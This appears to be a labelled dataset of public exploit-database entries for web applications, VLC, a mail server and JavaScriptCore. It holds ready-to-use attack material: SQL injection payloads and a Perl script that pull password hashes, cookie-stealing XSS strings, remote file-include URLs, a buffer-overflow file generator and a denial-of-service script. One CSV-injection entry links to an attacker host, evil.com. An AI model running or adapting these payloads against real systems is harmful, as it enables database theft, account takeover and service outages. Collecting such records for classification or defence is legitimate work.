2701,"TikiWiki 1.9.5 Sirius - 'sort_mode' Information Disclosure /*==========================================*/ //tikiwiki version 1.9.5 (CVS) -Sirius-  (PoC) // Product: Tikiwiki  // URL: http://tikiwiki.org/ // RISK: critical /*==========================================*/     there's a critical security bug in tikiwiki version 1.9.5 (CVS) -Sirius- a anonymous user , can dump the mysql user & passwd just by creating a mysql error with the ""sort_mode"" var , with those following links : /tiki-listpages.php?offset=0&sort_mode= /tiki-lastchanges.php?days=1&offset=0&sort_mode= /messu-archive.php?sort_mode= /messu-mailbox.php?sort_mode= /messu-sent.php?sort_mode= /tiki-directory_add_site.php?sort_mode= /tiki-directory_ranking.php?sort_mode= /tiki-directory_search.php?sort_mode= /tiki-forums.php?sort_mode= /tiki-view_forum.php?forumId= /tiki-friends.php?sort_mode= /tiki-list_blogs.php?sort_mode= /tiki-list_faqs.php?sort_mode= /tiki-list_trackers.php?sort_mode= /tiki-list_users.php?sort_mode= /tiki-my_tiki.php?sort_mode= /tiki-notepad_list.php?sort_mode= /tiki-orphan_pages.php?sort_mode= /tiki-shoutbox.php?sort_mode= /tiki-usermenu.php?sort_mode= /tiki-webmail_contacts.php?sort_mode=  a proof of concept is disponible here : http://cockor.free.fr/PoC.swf  there's also a xss here : /tiki-featured_link.php?type=f&url="" ></iframe><scr</script>ipt>alert('XSS')</scri</script>pt> <!--  regards , securfrog   # milw0rm.com [2006-11-01]","['Sirius', ""'sort_mode'""]",1
15559,"IceBB 1.0-rc10 - Multiple Vulnerabilities Vulnerability ID: HTB22688 Reference: http://www.htbridge.ch/advisory/sql_injection_in_icebb.html Product: IceBB Vendor: XAOS Interactive ( http://icebb.net/ )  Vulnerable Version: 1.0-rc10 Vendor Notification: 02 November 2010  Vulnerability Type: SQL Injection Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response Risk level: High  Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)   SQL Injection: The vulnerability exists due to failure in the ""/index.php"" script to properly sanitize user-supplied input in ""gmt"" variable. Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.  The following PoC is available:   <form action=""http://[host]/index.php"" method=""post"" > <input type=""hidden"" name=""act"" value=""login"" /> <input type=""hidden"" name=""func"" value=""Register"" /> <input type=""hidden"" name=""terms"" value=""1"" /> <input type=""hidden"" name=""user"" value=""pentest"" /> <input type=""hidden"" name=""pass"" value=""pentest"" /> <input type=""hidden"" name=""pass2"" value=""pentest"" /> <input type=""hidden"" name=""email"" value=""pentest@htbridge.ch"" /> <input type=""hidden"" name=""captcha_code"" value=""[captcha_code]"" /> <input type=""hidden"" name=""captcha_word"" value=""[captcha_word]"" /> <input type=""hidden"" name=""gmt"" value=""'SQL_CODE_HERE"" /> <input type=""submit"" value=""Register"" name=""submit"" /> </form>  Information Disclosure: The vulnerability exists due to failure in the ""/index.php"" script to properly sanitize user-supplied input in ""icebb_login_key"" variable from cookie, it's possible to generate an sql query error that will reveal the database tables prefix.   GET /index.php HTTP/1.0 Cookie: icebb_user=1; icebb_pass=2; icebb_uid=3; icebb_login_key=123\;  Information Disclosure: The vulnerability exists due to failure in the ""/index.php"" and ""/admin/index.php"" scripts to properly sanitize user-supplied input in ""s"" variable, it's possible to generate an sql query error that will reveal the database tables prefix.   http://[host]/index.php?act=login&func=captcha&s=\ http://[host]/admin/index.php?s=123%27  Path Disclosure: The vulnerability exists in the ""/modules/make_image.php"" script. A remote user can determine the full path to the web root directory and other potentially sensitive information.   http://[host]/modules/make_image.php","['index.php""']",1
47840,"Hospital Management System 4.0 - 'searchdata' SQL Injection # Exploit Title: Hospital Management System 4.0 - 'searchdata' SQL Injection # Google Dork: N/A # Date: 2020-01-02 # Exploit Author: FULLSHADE # Vendor Homepage: https://phpgurukul.com/ # Software Link: https://phpgurukul.com/hospital-management-system-in-php/ # Version: v4.0 # Tested on: Windows # CVE : CVE-2020-5192  # The Hospital Management System 4.0 web application is vulnerable to # SQL injection in multiple areas, listed below are 5 of the prominent # and easy to exploit areas.  ================================ 1 - SQLi ================================  POST /hospital/hospital/hms/doctor/search.php HTTP/1.1 Host: 10.0.0.214 User-Agent: Mozilla/5.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 22 Origin: https://10.0.0.214 DNT: 1 Connection: close Referer: https://10.0.0.214/hospital/hospital/hms/doctor/search.php Cookie: PHPSESSID=301tn3sqt3gmimkc9epe7kjha5 Upgrade-Insecure-Requests: 1  searchdata=&search=  ?searchdata parameter is vulnerable to SQL injection under the search feature in the doctor login.  POST parameter 'searchdata' is vulnerable. sqlmap identified the following injection point(s) with a total of 120 HTTP(s) requests: --- Parameter: searchdata (POST)     Type: UNION query     Title: Generic UNION query (NULL) - 11 columns     Payload: searchdata=' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT('qvxbq','zIuFTDXhtLrbZmAXQXxIalrRpZgCjsPnduKboFfW'),'qpqjq'),NULL-- PqeG&search= --- [15:49:58] [INFO] testing MySQL [15:49:58] [INFO] confirming MySQL [15:49:58] [INFO] the back-end DBMS is MySQL web application technology: Apache 2.4.41, PHP 7.4.1 back-end DBMS: MySQL >= 5.0.0 (MariaDB fork) [15:49:58] [INFO] fetching database names available databases [6]: [*] hms [*] information_schema [*] mysql [*] performance_schema [*] phpmyadmin [*] test  ================================ 2 - SQLi ================================  GET parameter 'viewid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests: --- Parameter: viewid (GET)     Type: boolean-based blind     Title: AND boolean-based blind - WHERE or HAVING clause     Payload: viewid=6' AND 3413=3413 AND 'nBkv'='nBkv      Type: time-based blind     Title: MySQL >= 5.0.12 AND time-based blind     Payload: viewid=6' AND SLEEP(5) AND 'PJim'='PJim      Type: UNION query     Title: Generic UNION query (NULL) - 11 columns     Payload: viewid=6' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162767071,0x7957464b6f4a78624b536a75497051715a71587353746a4b6e45716441646345614f725449555748,0x717a717a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- XNyp  [15:54:21] [INFO] fetching database names available databases [6]: [*] hms [*] information_schema [*] mysql [*] performance_schema [*] phpmyadmin [*] test  GET /hospital/hospital/hms/doctor/view-patient.php?viewid=6 HTTP/1.1 Host: 10.0.0.214 User-Agent: Mozilla/5.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Cookie: PHPSESSID=301tn3sqt3gmimkc9epe7kjha5 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0  ?viewid parameter is vulnerable to SQLi while viewing a patient under the doctor login  ================================ 3 - SQLi ================================  Parameter: bs (POST)     Type: time-based blind     Title: MySQL >= 5.0.12 AND time-based blind     Payload: bp=123&bs=123' AND SLEEP(5) AND 'CKbI'='CKbI&weight=123&temp=123&pres=123&submit=  ?bs parameter is vulnerable to SQL injection on the doctors login when adding medical history to a patient  ================================ 4 - SQLi ================================  POST /hospital/hospital/hms/doctor/add-patient.php HTTP/1.1 Host: 10.0.0.214 User-Agent: Mozilla/5.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://10.0.0.214/hospital/hospital/hms/doctor/add-patient.php Content-Type: application/x-www-form-urlencoded Content-Length: 111 Origin: https://10.0.0.214 DNT: 1 Connection: close Cookie: PHPSESSID=301tn3sqt3gmimkc9epe7kjha5 Upgrade-Insecure-Requests: 1  patname=  patname parameter is vulnerable to SQLi under the add patient in the doctor login  ================================ 5 - SQLi ================================  --- Parameter: cpass (POST)     Type: boolean-based blind     Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)     Payload: cpass=123' AND 4808=4808#&npass=123&cfpass=123&submit=123      Type: time-based blind     Title: MySQL >= 5.0.12 AND time-based blind     Payload: cpass=123' AND SLEEP(5)-- taxP&npass=123&cfpass=123&submit=123 --- available databases [6]: [*] hms [*] information_schema [*] mysql [*] performance_schema [*] phpmyadmin [*] test  POST /hospital/hospital/hms/admin/change-password.php HTTP/1.1 Host: 10.0.0.214 User-Agent: Mozilla/5.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 38 Origin: http://10.0.0.214 DNT: 1 Connection: close Referer: http://10.0.0.214/hospital/hospital/hms/admin/change-password.php Cookie: PHPSESSID=g1mpom762nglpeptn51b4rg5h5 Upgrade-Insecure-Requests: 1  cpass=123&npass=123&cfpass=123&submit=123  the ?cpass parameter is vulnerable to blind SQL injection","[""'searchdata'""]",1
46889,"Apple macOS < 10.14.5 / iOS < 12.3 JavaScriptCore - Loop-Invariant Code Motion (LICM) in DFG JIT Leaves Stack Variable Uninitialized While fuzzing JavaScriptCore, I encountered the following (modified and commented) JavaScript program which crashes jsc from current HEAD and release:      // Run with --useConcurrentJIT=false      // Fill the stack with the return value of the provided function.     function stackspray(f) {         // This function will spill all the local variables to the stack         // since they are needed for the returned array.         let v0 = f(); let v1 = f(); let v2 = f(); let v3 = f();         let v4 = f(); let v5 = f(); let v6 = f(); let v7 = f();         return [v0, v1, v2, v3, v4, v5, v6, v7];     }     // JIT compile the stack spray.     for (let i = 0; i < 1000; i++) {         // call twice in different ways to prevent inlining.         stackspray(() => 13.37);         stackspray(() => {});     }      for (let v15 = 0; v15 < 100; v15++) {         function v19(v23) {             // This weird loop form might be required to prevent loop unrolling...             for (let v30 = 0; v30 < 3; v30 = v30 + ""asdf"") {                 // Generates the specific CFG necessary to trigger the bug.                 const v33 = Error != Error;                 if (v33) {                 } else {                     // Force a bailout.                     // CFA will stop here and thus mark the following code as unreachable.                     // Then, LICM will ignore the memory writes (e.g. initialization of stack slots)                     // performed by the following code and will then move the memory reads (e.g.                     // access to stack slots) above the loop, where they will, in fact, be executed.                     const v34 = (1337)[-12345];                 }                  function v38(v41) {                     // v41 is 8 bytes of uninitialized stack memory here, as                     // (parts of) this code get moved before the loop as well.                     return v41.hax = 42;                 }                 for (let v50 = 0; v50 < 10000; v50++) {                     let o = {hax: 42};                     const v51 = v38(o, ...arguments);                 }             }             // Force FTL compilation, probably.             for (let v53 = 0; v53 < 1000000; v53++) {             }         }          // Put controlled data onto the stack.         stackspray(() => 3.54484805889626e-310);        // 0x414141414141 in binary         // Call the miscompiled function.         const v55 = v19(1337);     }   This yields a crash similar to the following:  # lldb -- /System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc --useConcurrentJIT=false current.js (lldb) target create ""/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc"" Current executable set to '/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc' (x86_64). (lldb) settings set -- target.run-args  ""--useConcurrentJIT=false"" ""current.js"" (lldb) r Process 45483 launched: '/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc' (x86_64) Process 45483 stopped * thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)     frame #0: 0x000025c3ca81306e ->  0x25c3ca81306e: cmp    dword ptr [rax], 0x127     0x25c3ca813074: jne    0x25c3ca81316f     0x25c3ca81307a: mov    dword ptr [rbp + 0x24], 0x1     0x25c3ca813081: movabs rax, 0x7fff3c932a70 Target 0: (jsc) stopped. (lldb) reg read rax      rax = 0x0001414141414141           // Note the additional 0x1 at the start due to the NaN boxing scheme (see JSCJSValue.h)  The same sample also sometimes triggers a crash with --useConcurrentJIT=true (the default), but it is more reliable with concurrent JIT disabled. If the sprayed value is a valid pointer, that pointer would either be treated as an object with the structure of `o` in the following code (if the first dword matches the structure ID), or it would be treated as a JSValue after a bailout to the baseline JIT/interpreter.   It appears that what is happening here is roughly the following:  When v19 is JIT compiled in the DFG, it emits the following (shortened and simplified) DFG IR for the body of the loop:      # BASIC BLOCK #9 (loop body)      # Create object `o`      110:   NewObject()      116:   PutByOffset(@110, @113, id1{hax})      117:   PutStructure(@110, ID:430)       # Spread `o` and `arguments` into a new array and use that for a varargs call      131:   Spread(@30)      134:   NewArrayWithSpread(@110, @131)      142:   LoadVarargs(@134, R:World, W:Stack(-26),Stack(-24),Stack(-23),Stack(-22),Heap)       # Inlined call to v38, load the first argument from the stack (where LoadVarargs put it)        8:   GetStack(R:Stack(-24))        177:     CheckStructure(@8)        178:     PutByOffset(@8, @113, id1{hax})        ...  During loop-invariant code motion (LICM), the GetStack operation, reading from the stack slot initialized by the LoadVarargs operation, is moved in front of the loop (together with parts of the inlined v38 function), thus yielding:      # BASIC BLOCK #2 (before loop header)        8:   GetStack(R:Stack(-24))        177:     CheckStructure(@8)       # BASIC BLOCK #9 (loop body)      # Create object `o`       ...       # Spread `o` and `arguments` into a new array and use that for a varargs call      ...      142:   LoadVarargs(@134, R:World, W:Stack(-26),Stack(-24),Stack(-23),Stack(-22),Heap)      ...  As such, in the resulting machine code, the value for v41 (the argument for the inner function) will be loaded from an uninitialized stack slot (which is only initialized later on in the code).  Normally, this shouldn't happen as the LoadVarargs operations writes into the stack (W:Stack(-24)), and GetStack reads from that (R:Stack(-24)). Quoting from DFGLICMPhase.cpp: ""Hoisting is valid if: ... The node doesn't read anything that the loop writes."". As such, GetStack should not have been moved in front of the loop.  The reason that it was still moved appears to be a logical issue in the way LICM deals with dead code: LICM relies on the data computed by control flow analysis (CFA) to know whether a block will be executed at all. If a block will never be executed (and so is dead code), then LICM does not take into account memory writes (e.g. to Stack(-24)) performed by any operation in this block (See https://github.com/WebKit/webkit/blob/c755a5c371370d3a26f2dbfe0eea1b94f2f0c38b/Source/JavaScriptCore/dfg/DFGLICMPhase.cpp#L88). It appears that this behaviour is incorrect, as in this case, CFA correctly concludes that block #9 is dead code (see below). As such, LICM doesn't ""see"" the memory writes and incorrectly moves the GetStack operation (reading from a stack slot) in front of the LoadVarargs operation (initializing that stack slot).  To understand why CFA computes that the loop body (block #9) is unreachable, it is necessary to take a look at the (simplified) control flow graph for v9, which can be found in the attachment (as it needs to be rendered in monospace font :)). In the CFG, block #3, corresponding to the `if`, is marked as always taking the false branch (which is correct), and thus jumping to block 5. Block 5 then contains a ForceOSRExit operation due to the out-of-bounds array access, which the JIT doesn't optimize for. As this operation terminates execution in the DFG, CFA also stops here and never visits the rest of the loop body and in particular never visits block #9.   To recap: in the provided JavaScript program, CFA correctly computes that basic block #9 is never executed. Afterwards, LICM decides, based on that data, to ignore memory writes performed in block #9 (dead code), then moves memory reads from block #9 (dead code) into block #2 (alive code). The code is then unsafe to execute. It is likely that this misbehaviour could lead to other kinds of memory corruption at runtime.                +-----+              |  0  +----+              +-----+    | +-----+                 | |  1  +-------+         v +-----+       |     +-----------+    ^          |     |    2      |    |          +---->| loop head |    |                +-----+-----+    |                      |    |                      v    |                 +---------+    |                 |    3    |    |                 | if head |    |                 +--+---+--+    |                    |   |    |       +-----+      |   |      +-----+    |       |  5  |<-----+   +----->|  4  |    |       +--+--+                 +--+--+    |    OSRExit here                  |    |                   +-----+        |    |                   |  6  |<-------+    |                   +--+--+    |       +------+       |    +-------+ 7-10 |<------+            +---+--+        Rest of | Loop body                |                | To End of function","['JIT', 'LICM', 'JSCJSValue.h)']",1
25232,McNews 1.x - 'install.php' Arbitrary File Inclusion source: https://www.securityfocus.com/bid/12835/info  mcNews is reportedly affected by a remote file include vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input to the 'install.php' script.  This issue is reported to affect mcNews versions 1.3 and prior.   http://www.example.com/path/to/mcnews/admin/install.php?l=http://www.example.com,"[""'install.php'""]",1
48204,"WordPress Plugin Appointment Booking Calendar 1.3.34 - CSV Injection # Exploit Title: Wordpress Plugin Appointment Booking Calendar 1.3.34 - CSV Injection # Google Dork: N/A # Date: 2020-03-05 # Exploit Author: Daniel Monzón (stark0de) # Vendor Homepage: https://www.codepeople.net/ # Software Link: https://downloads.wordpress.org/plugin/appointment-booking-calendar.zip # Version: 1.3.34 # Tested on: Windows 7 x86 SP1 # CVE : CVE-2020-9371, CVE-2020-9372  ----Stored Cross-Site-Scripting-------------------  1) In http://127.0.0.1/wordpress/wp-admin/admin.php?page=cpabc_appointments.php 2) Calendar Name=<script>alert(0)</script> and Update 3) Click in any of the other tabs  ----CSV injection---------------------------------  1) First we create a new calendar (Pages, add new, booking calendar) and Publish it (we can now log out)  2) Then we go to the page and introduce data, and the payload:  New booking:  Name: IMPORTANT DATA Description: http://evil.com/evil.php  New booking:  Name: test Description: =HYPERLINK(K2;H2)   This is the way it would work if i had a business registered and the payment was completed it can also be done by adding the new bookings with the same data from the admin panel  3) Then we go to Bookings List and export the CSV file 4) After that we open the file, and import data from an external file, using comma as separator 5) Hyperlink to malicious PHP file is inserted and the user clicks on it, user is redirected to a fake login page (for example)  Tested on Windows 7 Pro SP1 32-bit, Wordpress 5.3.2 and Excel 2016",['CSV'],0
34487,"Facil Helpdesk - 'kbase/kbase.php' URI Cross-Site Scripting source: https://www.securityfocus.com/bid/42528/info  Facil Helpdesk is prone to multiple input-validation vulnerabilities, including a cross-site scripting vulnerability, a local file-include vulnerability, and a remote file-include vulnerability.  An attacker can exploit these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, obtain potentially sensitive information, execute local script code in the context of the application, or to execute arbitrary code within the context of the webserver process; other attacks are also possible.  Facil Helpdesk 2.3 Lite is vulnerable; other versions may also be affected.  http://www.example.com/kbase/kbase.php/""><script>alert(document.cookie);</script>","[""'kbase/kbase.php'""]",1
9461,E CMS 1.0 - 'index.php?s' SQL Injection ==============================================================================                          ##  Hackteach.OrG ##                                     zZzZzZz                 zZzZzZz                           Zz     ooooo            Zz                              Zz      o   o           Zz                           Zz       o   o          Zz                         Zz        o   o         Zz                           Zz         ooooo        Zz                       zZzZzZz                 zZzZzZz              ==============================================================================         [Â»] ~ Note : Hacker R0x Lamerz Sux ! ==============================================================================         [Â»]  E Cms <= 1.0 Remote SQL Injection Vulnerability ==============================================================================     [Â»] my home:            [ Hackteach.org ]     [Â»] Script:               [ E Cms 1.0]     [Â»] Language:           [ PHP ]     [Â»] Home:               [ http://cmsdemo.enterbt.hu ]     [Â»] Founder:            [ Red-D3v1L < php-c0de@hotmail.com > ]     [Â»] Gr44tz to:          [ All member Hackteach.org/cc And Str0ke :$ ]     [Â»] Fuck To :           [ Anti-trust << Big Big Big Lamer << ] #########################################################################   ===[ Exploit SQL ]===       [Â»] Path/index.php?s=-10+union+select+version()--     [Â»] L1v3 d3m0 : http://cmsdemo.enterbt.hu/html/index.php?s=-10+union+select+version()--  Author: Red-D3v1L <-  ###########################################################################  # milw0rm.com [2009-08-18],"[""'index.php?s'""]",1
6759,"mystats - 'hits.php' Multiple Vulnerabilities # myStats (hits.php) Multiple Remote Vulnerabilities Exploit # url: http://mywebland.com/ # # Author: JosS # mail: sys-project[at]hotmail[dot]com # site: http://spanish-hackers.com # team: Spanish Hackers Team - [SHT] # # This was written for educational purpose. Use it at your own risk. # Author will be not responsible for any damage. # # Greetz To: All Hackers and milw0rm website  --------------------- Break System Block IP ---------------------  <<hits.php>>  7: if (@getenv(""HTTP_X_FORWARDED_FOR""))      { $u_ip = @getenv(""HTTP_X_FORWARDED_FOR""); }      else { $u_ip = @getenv(""REMOTE_ADDR""); }        if ($u_ip == BLOCK_IP)       { return 1;   13:  exit; }   <<config.php>>  11: define(""BLOCK_IP"", ""127.0.0.1"");   <<exploit.pl>>  use HTTP::Request; use LWP::UserAgent;  my $web=""http://localhost/hits.php""; my $ua=LWP::UserAgent->new(); $ua->default_header('X-Forwarded-For' => ""127.1.1.1""); my $respuesta=HTTP::Request->new(GET=>$web); $ua->timeout(30); my $response=$ua->request($respuesta); $contenido=$response->content; if ($response->is_success) { open(FILE,"">>results.txt""); print FILE ""$contenido\n""; close(FILE); print ""\n[+] Exploit Succesful!\n\n""; } else { print ""\n[-] Exploit Failed!\n\n""; }  <<proof of concept>>  $ua->default_header('X-Forwarded-For' => ""127.1.1.1""); --> BREAK BLOCK_IP  ------------- SQL Injection -------------  <<hits.php>>  63: if (isset($_GET['sortby']))      {$sortby = $_GET['sortby'];}      else      { $sortby =  'timestamp' ;}       $sql = ""SELECT * FROM "" . LOG_TBL . "" ORDER BY "" . $sortby."" DESC LIMIT 0, "". DISPLAY_LOG_NO ;  69: $querylog = mysql_query($sql) or die(""Line 117 Cannot query the database.<br>"" . mysql_error());  <<exploit.pl>>  use HTTP::Request; use LWP::UserAgent;  my $web=""http://localhost/hits.php?sortby=1'""; my $ua=LWP::UserAgent->new(); my $respuesta=HTTP::Request->new(GET=>$web); $ua->timeout(30); my $response=$ua->request($respuesta); $contenido=$response->content; if ($response->is_success) { if($contenido =~ /You have an error in your SQL syntax;/) { print ""\n[+] Exploit Succesful!\n""; print ""\n[+] Content:\n""; print ""$contenido\n\n""; } } else { print ""\n[-] Exploit Failed!\n\n""; }  # milw0rm.com [2008-10-15]","[""'hits.php'""]",1
3195,"GPS CMS 1.2 - 'print.asp' SQL Injection ******************************************************************************* # Title   :  GPS 1.2 Content Managing System (print.asp) Remote SQL Injection Vulnerability # Author  :  ajann # Contact :  :( # S.Page  :  http://www.guox.de || http://www.planetsourcecode.com/vb/scripts/ShowCode.asp?txtCodeId=7227&lngWId=4 # $$      :  Free  *******************************************************************************  [[SQL]]]---------------------------------------------------------  http://[target]/[path]//print.asp?id=[SQL]  Example:  //print.asp?id=-1%20union%20select%200,0,0,Benutzername,0%20from%20userdb%20where%20ID=10 //print.asp?id=-1%20union%20select%200,0,0,Passwort,0%20from%20userdb%20where%20ID=10  [[/SQL]]  """""""""""""""""""""""""""""""""""""""""" # ajann,Turkey # ...  # Im not Hacker!  # milw0rm.com [2007-01-25]","[""'print.asp'""]",1
9427,"VideoLAN VLC Media Player 1.0.0/1.0.1 - 'smb://' URI Handling Buffer Overflow (PoC) #!/usr/bin/env python  ############################################################################ # # VLC Media Player 1.0.0\1.0.1 smb:// URI Handling Remote Stack Overflow PoC # Found By:	Dr_IDE # Tested:	Windows XP SP2 , XP SP3 and Windows 7 RC1 # Thanks:	Pankaj Kohli for finding this in 0.8.6f # Original:	http://www.milw0rm.com/exploits/9303 # ############################################################################  # Crash Breakdown of vlc v1.0.1 on XP SP2/SP3 """""" EAX FFFFFFFE ECX 42424242 <---- Bytes 3-6 of our payload EDX 00000000 EBX 42424242 <---- Bytes 3-6 of our payload ESP 02CBF694 EBP 02CBF7C4 ESI 61CC8324 libacc_4.61CC8324 EDI 61CC8323 libacc_4.61CC8323 EIP 77C478AC msvcrt.77C478AC C 0  ES 0023 32bit 0(FFFFFFFF) P 0  CS 001B 32bit 0(FFFFFFFF) A 0  SS 0023 32bit 0(FFFFFFFF) Z 0  DS 0023 32bit 0(FFFFFFFF) S 0  FS 003B 32bit 7FFAC000(FFF) T 0  GS 0000 NULL D 0 O 0  LastErr ERROR_MOD_NOT_FOUND (0000007E) EFL 00010202 (NO,NB,NE,A,NS,PO,GE,G) ST0 empty -UNORM FB18 77C2C3E7 00E128A0 ST1 empty +UNORM 2088 00000000 00000000 ST2 empty %#.19L ST3 empty -??? FFFF 00000000 77C2C42E ST4 empty 0.9999999999999289457 ST5 empty %#.19L ST6 empty 0.9999999999999289457 ST7 empty 0.5000000000000000000                3 2 1 0      E S P U O Z D I FST 0020  Cond 0 0 0 0  Err 0 0 1 0 0 0 0 0  (GT) FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1 """"""   header1 =  (""<?xml version=\""1.0\"" encoding=\""UTF-8\""?>\n"") header1 += (""<playlist version=\""1\"" xmlns=\""http://xspf.org/ns/0/\"" xmlns:vlc=\""http://www.videolan.org/vlc/playlist/ns/0/\"">\n"") header1 += (""\t<title>Playlist</title>\n"") header1 += (""\t<trackList>\n"") header1 += (""\t\t<track>\n"") header1 += (""\t\t\t<location>smb://example.com@www.example.com/foo/#{"")  # Stack Overwrite after first 2 bytes of URI. It seems that you can't put traditional NOP's in here BTW. # Code execution does not seem possible.  payload = (""\x41"" * 2 + ""\x42"" * 4 + ""\x43"" * 10000)  header2 =  (""}</location>\n""); header2 += (""\t\t\t<extension application=\""http://www.videolan.org/vlc/playlist/0\"">\n""); header2 += (""\t\t\t\t<vlc:id>0</vlc:id>\n""); header2 += (""\t\t\t</extension>\n""); header2 += (""\t\t</track>\n""); header2 += (""\t</trackList>\n""); header2 += (""</playlist>\n"");  try:     f1 = open(""vlc_1.0.X.xspf"",""w"")     f1.write(header1 + payload + header2)     f1.close()     print(""\nExploit file created!\n"") except:     print ""Error""  # milw0rm.com [2009-08-13]","[""'smb://'"", 'smb:']",1
594,"BaSoMail Server 1.24 - POP3/SMTP Remote Denial of Service #!/usr/bin/perl   ############################################### #  BaSoMail Server POP3 and SMTP v1.24 D.o.S  #	 #  Discovered by Ziv Kamir,exploited by KaGra # #					      # #  This Sploit sends as HELO request 1 packet # #  of 30K of data.If U use it at least 3 times# #   SMTP and POP services will be D.o.Sed.    # #     	 Tested in WinXP SP1 EnGlish	      #	 ###############################################     use Net::SMTP; print ""\n[*]BuiLDinG BuFfer...\n""; $evil = 'A'x30000   ;  print ""[*]@@@...SenDing DeViL...HeLL UnleaSheD...wait at least 30 seconds...@@@\n"";  $smtp = Net::SMTP->new('localhost', 			Hello=>$evil, 			Timeout=>30, 			 			);  print ""\nTarGet Has BeeN D.o.Sed,use Exploit at Least 3 times \n""; print ""and then check if Server aLiVe!\n\n"";  # milw0rm.com [2004-10-24]",['POP3/SMTP'],1
9631,"iDesk - 'download.php?cat_id' SQL Injection ############################################################### #################### Viva IslaM Viva IslaM #################### ## ## Remote SQL Injection Vulnerability ( download.php cat_id ) ## ## iDesk ## ## http://www.nicecoder.com ## ############################################################### ############################################################### ## ## AuTh0r : Mr.SQL ## ## H0ME   : WwW.55a.NeT ## ## Email  : SQL@Hotmail.iT ## ######################## ######################## ## ## -[[: ExploiteS :]]- ## ## www.TraGeT.CoM/download.php?cat_id=-1+UNION+SELECT+0,0,0,@@VERSION,0,0,0,0,0-- ## ######################## ########################    ######################################################################################################### #########################################################################################################                                   -(:: !Gr3E3E3E3E3E3E3TzZ! ::)-                                          :: HaCkEr_EGy :: Dark MaSTer  :: His0k4 :: User-Ma$keN :: ALwHeD :: Ghost Hacker :: MuslimS HaCkErS :: ######################################################################################################### #########################################################################################################  # milw0rm.com [2009-09-10]","[""'download.php?cat_id'""]",1
37013,"NextBBS 0.6 - 'index.php?do' Cross-Site Scripting source: https://www.securityfocus.com/bid/52728/info   NextBBS is prone to multiple SQL-injection vulnerabilities, a cross-site scripting vulnerability, and an authentication-bypass vulnerability.   Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, exploit latent vulnerabilities in the underlying database, and bypass the authentication process to gain unauthorized access to the system.   NextBBS 0.6.0 is vulnerable; other versions may also be affected.   http://www.example.com/nextbbs.0.6.0/index.php?do=<body+onload=alert(document.cookie);>","[""'index.php?do'""]",1
3146,"Woltlab Burning Board 1.0.2/2.3.6 - 'search.php' SQL Injection (3) #!/usr/bin/perl use LWP::UserAgent; use HTTP::Response;  $| = 1; print "" ################################################### ## ## Woltlab Burning Board 2.3.6 <= / Lite Exploit  ## ################################################### ## ## Coded by 666 <http://blueshisha.mutebox.net> ## Bug by trew ## ################################################### \n"";  if($#ARGV < 0) {         print ""[x] Usage: wbbsploit.pl [Target] [Userid] [Searchstring]\n"";         exit; } print ""<~> Exploiting...\n""; my $url = shift; my $id = shift; my $sstring = shift;  my $ua = LWP::UserAgent->new; my $request = new HTTP::Request('POST', 'http://'.$url.'search.php'); $request->content('searchuser=&name_exactly=1&topiconly=0&showposts=0&searchdate=0&beforeafter=after&sortby=lastpost&sortorder=desc&send=send&sid=&submit=Suchen&boardids%5B%5D=1)%20UNION%20SELECT%20username,password%20FROM%20bb1_users%20WHERE%20userid='.$id.'/*&searchstring='.$sstring.''); $request->content_type('application/x-www-form-urlencoded'); my $response = $ua->request($request); my $body     = $response->content; print ""<~> Hash: ""; $body=~/([a-f0-9]{32})/; print $1; print ""\n"";  # milw0rm.com [2007-01-17]","[""'search.php'""]",1
22003,"MyBB Profile Albums Plugin 0.9 - 'albums.php?album' SQL Injection # Exploit Title: Profile Albums MyBB plugin SQL Injection 0day # Google Dork: inurl:albums.php intext:""powered by Mybb"" # Date: 14.10.2012 # Exploit Author: Zixem # Software Link: http://mods.mybb.com/view/profilealbums # Version: 0.9 # Tested on: Linux. ----------------------------------------------  The vulnerabillity exist within albums.php :  	<? 		/*Line 69*/	$aid = $mybb->input['album'];  		/*Line 86*/	$query_add_breadcrumb = $db->simple_select(""albums"", ""*"", ""aid='"".$aid.""'""); 	?>  /albums.php?action=editimage&image=[Vaild_ID]&album=[Vaild_album_ID][SQLi]  (You need to create a new account && upload album and images) ---------------------------------------------- Image : http://i.imgur.com/yeAx0.png   Follow: https://twitter.com/PonyBlaze","[""'albums.php?album'""]",1
